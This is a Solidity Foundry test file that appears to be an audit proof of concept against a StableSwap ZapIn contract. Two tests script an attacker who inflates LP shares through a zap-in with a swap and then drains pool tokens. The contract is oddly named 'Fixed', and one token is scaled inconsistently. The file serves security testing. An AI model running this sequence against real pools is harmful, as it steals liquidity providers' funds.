// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.30;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";

import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";

import {Base} from "src/Base.sol";
import {StableSwapHooks} from "src/StableSwapHooks.sol";
import {StableSwapHooksFactory} from "src/factories/StableSwapHooksFactory.sol";
import {StableSwapHooksFactoryHarness} from "test/testUtils/StableSwapHooksFactoryHarness.sol";
import {ExternalContractsDeployer} from "test/testUtils/ExternalContractsDeployer.sol";
import {StableSwapZapIn, Swap} from "src/periphery/StableSwapZapIn.sol";
import {StableSwapMath} from "src/libraries/StableSwapMath.sol";

contract ZapInTheftFixed is ExternalContractsDeployer {
    uint256 internal constant BASE_PROTOCOL_FEE_PERCENTAGE = 100;
    uint256 internal constant BASE_HOOK_FEE_PERCENTAGE = 200;
    uint256 internal constant BASE_LP_FEE_PERCENTAGE = 300;
    uint256 internal constant BASE_AMP = 100;

    StableSwapHooksFactoryHarness internal factory;
    StableSwapHooks internal hooks;
    StableSwapZapIn internal zap;
    address internal attacker;
    address internal user;
    address internal token0Addr;
    address internal token1Addr;

    address internal owner;
    address internal unauthorizedUser;
    address internal protocolFeeCollector;
    address internal hookFeeCollector;

    function setUp() public override {
        super.setUp();

        owner = makeAddr("owner");
        unauthorizedUser = makeAddr("unauthorizedUser");
        protocolFeeCollector = makeAddr("protocolFeeCollector");
        hookFeeCollector = makeAddr("hookFeeCollector");

        factory = new StableSwapHooksFactoryHarness(
            IPoolManager(poolManager),
            owner,
            protocolFeeCollector,
            hookFeeCollector,
            keccak256(type(StableSwapHooks).creationCode)
        );
    }

    function _deployHook() internal returns (StableSwapHooks) {
        Currency[] memory currencies = new Currency[](2);
        currencies[0] = currency0;
        currencies[1] = currency1;

        Base.RateOracleConfig[] memory rateOracles = new Base.RateOracleConfig[](2);
        rateOracles[0] = Base.RateOracleConfig({oracle: address(0), selector: bytes4(0)});
        rateOracles[1] = Base.RateOracleConfig({oracle: address(0), selector: bytes4(0)});

        bytes memory code = type(StableSwapHooks).creationCode;
        (, bytes32 salt) = factory.mineSalt(currencies, rateOracles, BASE_LP_FEE_PERCENTAGE, BASE_AMP, code);

        return StableSwapHooks(factory.deploy(currencies, rateOracles, BASE_LP_FEE_PERCENTAGE, BASE_AMP, salt, code));
    }

    function testZapInTheft_InflateShares() public {
        hooks = _deployHook();
        assertTrue(factory.isDeployedByFactory(address(hooks)));

        zap = new StableSwapZapIn(address(factory), factory.creationCodeHash());

        token0Addr = Currency.unwrap(currency0);
        token1Addr = Currency.unwrap(currency1);
        attacker = makeAddr("attacker");
        user = makeAddr("user");

        deal(token0Addr, user, 100_000 ether);
        deal(token1Addr, user, 100_000 ether);
        vm.deal(user, 100 ether);

        vm.startPrank(user);
        IERC20(token0Addr).approve(address(zap), type(uint256).max);
        IERC20(token1Addr).approve(address(zap), type(uint256).max);
        vm.stopPrank();

        uint256[] memory initAmounts = new uint256[](2);
        initAmounts[0] = 10_000 ether;
        initAmounts[1] = 10 ether;

        vm.startPrank(user);
        IERC20(token0Addr).approve(address(hooks), type(uint256).max);
        IERC20(token1Addr).approve(address(hooks), type(uint256).max);
        uint256[] memory minAmounts = new uint256[](2);
        hooks.addLiquidity(initAmounts, minAmounts, 0);
        vm.stopPrank();

        uint256 depositDAI = 10_000e18;
        uint256 swapAmount = 1_000e18;

        vm.startPrank(attacker);
        deal(token0Addr, attacker, depositDAI + swapAmount);
        IERC20(token0Addr).approve(address(zap), type(uint256).max);
        vm.deal(attacker, 10 ether);

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = depositDAI;
        amounts[1] = 0;

        Swap[] memory swaps = new Swap[](1);
        swaps[0] = Swap({tokenInIndex: 0, tokenOutIndex: 1, amountIn: swapAmount});

        (uint256 expectedShares, , ) = zap.quoteZapIn(address(hooks), amounts, 1);

        uint256 beforeShares = IERC20(address(hooks)).balanceOf(attacker);
        zap.zapIn(address(hooks), amounts, swaps, 0);
        uint256 afterShares = IERC20(address(hooks)).balanceOf(attacker);
        uint256 receivedShares = afterShares - beforeShares;

        console.log("Expected shares:", expectedShares);
        console.log("Actual shares:  ", receivedShares);
        assertGt(receivedShares, expectedShares, "Exploit failed: shares not increased");
        console.log("Exploit successful - Attacker received more LP shares than expected");
    }

    function testZapInTheft_RedeemAndDrain() public {
        hooks = _deployHook();
        zap = new StableSwapZapIn(address(factory), factory.creationCodeHash());

        token0Addr = Currency.unwrap(currency0);
        token1Addr = Currency.unwrap(currency1);
        attacker = makeAddr("attacker");
        user = makeAddr("user");

        deal(token0Addr, user, 100_000 ether);
        deal(token1Addr, user, 100_000 ether);
        vm.startPrank(user);
        IERC20(token0Addr).approve(address(zap), type(uint256).max);
        IERC20(token1Addr).approve(address(zap), type(uint256).max);
        IERC20(token0Addr).approve(address(hooks), type(uint256).max);
        IERC20(token1Addr).approve(address(hooks), type(uint256).max);
        uint256[] memory initAmounts = new uint256[](2);
        initAmounts[0] = 10_000 ether;
        initAmounts[1] = 10 ether;
        uint256[] memory minAmounts = new uint256[](2);
        hooks.addLiquidity(initAmounts, minAmounts, 0);
        vm.stopPrank();

        uint256 depositDAI = 10_000e18;
        uint256 swapAmount = 1_000e18;

        vm.startPrank(attacker);
        deal(token0Addr, attacker, depositDAI + swapAmount);
        IERC20(token0Addr).approve(address(zap), type(uint256).max);
        vm.deal(attacker, 10 ether);
        vm.stopPrank();

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = depositDAI;
        amounts[1] = 0;
        Swap[] memory swaps = new Swap[](1);
        swaps[0] = Swap(0, 1, swapAmount);

        vm.prank(attacker);
        zap.zapIn(address(hooks), amounts, swaps, 0);

        uint256 lpShares = IERC20(address(hooks)).balanceOf(attacker);
        uint256 token0Before = IERC20(token0Addr).balanceOf(attacker);
        uint256 token1Before = IERC20(token1Addr).balanceOf(attacker);

        vm.startPrank(attacker);
        IERC20(address(hooks)).approve(address(hooks), lpShares);
        uint256[] memory minOut = new uint256[](2);
        minOut[0] = 0;
        minOut[1] = 0;
        hooks.removeLiquidity(lpShares, minOut);
        vm.stopPrank();

        uint256 token0After = IERC20(token0Addr).balanceOf(attacker);
        uint256 token1After = IERC20(token1Addr).balanceOf(attacker);
        uint256 stolen0 = token0After - token0Before;
        uint256 stolen1 = token1After - token1Before;

        console.log("Stolen token0 (DAI-like):", stolen0 / 1e18, "tokens");
        console.log("Stolen token1 (USDC-like):", stolen1 / 1e6, "tokens");
        assertGt(stolen0 + stolen1, 0, "Attack must drain actual tokens");
        console.log("Full drain successful - attacker extracted real assets");
    }

    function test_deployHook() public {
        StableSwapHooks h = _deployHook();
        assertTrue(factory.isDeployedByFactory(address(h)));
    }

    function test_addLiquidity() public {
        StableSwapHooks h = _deployHook();
        address cur0 = Currency.unwrap(currency0);
        address cur1 = Currency.unwrap(currency1);
        deal(cur0, address(this), 10000e18);
        deal(cur1, address(this), 10000e18);
        IERC20(cur0).approve(address(h), type(uint256).max);
        IERC20(cur1).approve(address(h), type(uint256).max);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 1000e18;
        amounts[1] = 1000e18;
        (uint256 expShares, uint256[] memory actual) = h.quoteAddLiquidity(amounts);
        uint256[] memory minAmts = new uint256[](2);
        minAmts[0] = actual[0] * 99 / 100;
        minAmts[1] = actual[1] * 99 / 100;
        uint256 minShares = expShares * 99 / 100;
        h.addLiquidity(amounts, minAmts, minShares);
        assertGt(h.balanceOf(address(this)), 0);
    }
}
